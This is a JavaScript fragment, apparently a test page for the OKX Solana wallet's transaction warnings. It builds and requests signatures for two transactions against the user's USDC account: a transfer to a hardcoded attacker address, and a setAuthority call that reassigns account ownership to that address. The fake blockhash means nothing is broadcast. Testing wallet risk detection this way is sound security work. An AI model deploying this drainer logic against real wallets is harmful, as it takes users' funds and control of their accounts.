</script>

<script>
var out = document.getElementById("out");
function log(t){ out.textContent = (new Date().toISOString().substr(11,12)) + " " + t + "\n" + out.textContent; }

const ATTACKER = "ATokenwy1tFwbeT7s3CQwMkdLMfFgQDPNYSC1xUUfo3";  // base58, 32 bytes
const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";  // real USDC on Solana mainnet
const TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const SYSTEM_PROGRAM = "11111111111111111111111111111111";
const SYSVAR_RECENT_BLOCKHASHES = "SysvarRecentB1ockHashes11111111111111111111";
const FAKE_BLOCKHASH = "11111111111111111111111111111112";

async function ensureConnected(){
  var ow = window.okxwallet;
  if(!ow.solana.publicKey){ await ow.solana.connect(); }
  return new window._sol.PublicKey(ow.solana.publicKey.toString());
}

async function connect(){
  try{
    var pk = await ensureConnected();
    log("CONNECTED: " + pk.toString());
    if(window._spl){
      // derive user USDC ATA
      var mint = new window._sol.PublicKey(USDC_MINT);
      var ata = await window._spl.getAssociatedTokenAddress(mint, pk);
      log("USDC ATA: " + ata.toString());
      window.USDC_ATA = ata;
    }
  }catch(e){ log("ERR: " + e.message); }
}

async function t1_spl_transfer(){
  log("=== [T1] SPL Token transfer (1 USDC unit to attacker) ===");
  try{
    if(!window._sol || !window._spl){ log("missing libs"); return; }
    var from = await ensureConnected();
    var fromATA = window.USDC_ATA || await window._spl.getAssociatedTokenAddress(new window._sol.PublicKey(USDC_MINT), from);
    var attackerATA = await window._spl.getAssociatedTokenAddress(new window._sol.PublicKey(USDC_MINT), new window._sol.PublicKey(ATTACKER));
    var ix = window._spl.createTransferInstruction(fromATA, attackerATA, from, 1);
    var tx = new window._sol.Transaction();
    tx.add(ix);
    tx.recentBlockhash = FAKE_BLOCKHASH;
    tx.feePayer = from;
    var t0 = Date.now();
    var signed = await window.okxwallet.solana.signTransaction(tx);
    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
  }catch(e){ log("ERR: " + e.message); }
}

async function t2_spl_setAuthority(){
  log("=== [T2] SPL Token setAuthority (USDC ATA owner -> attacker) ===");
  try{
    if(!window._sol || !window._spl){ log("missing libs"); return; }
    var from = await ensureConnected();
    var fromATA = window.USDC_ATA || await window._spl.getAssociatedTokenAddress(new window._sol.PublicKey(USDC_MINT), from);
    var ix = window._spl.createSetAuthorityInstruction(
      fromATA,
      from,
      window._spl.AuthorityType.AccountOwner,
      new window._sol.PublicKey(ATTACKER)
    );
    // Add tiny dust transfer to test if it changes classification
    var tx = new window._sol.Transaction();
    tx.add(window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(ATTACKER),lamports:1}));
    tx.add(ix);
    tx.recentBlockhash = FAKE_BLOCKHASH;
    tx.feePayer = from;
    var t0 = Date.now();
    var signed = await window.okxwallet.solana.signTransaction(tx);
    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
  }catch(e){ log("ERR: " + e.message); }
}
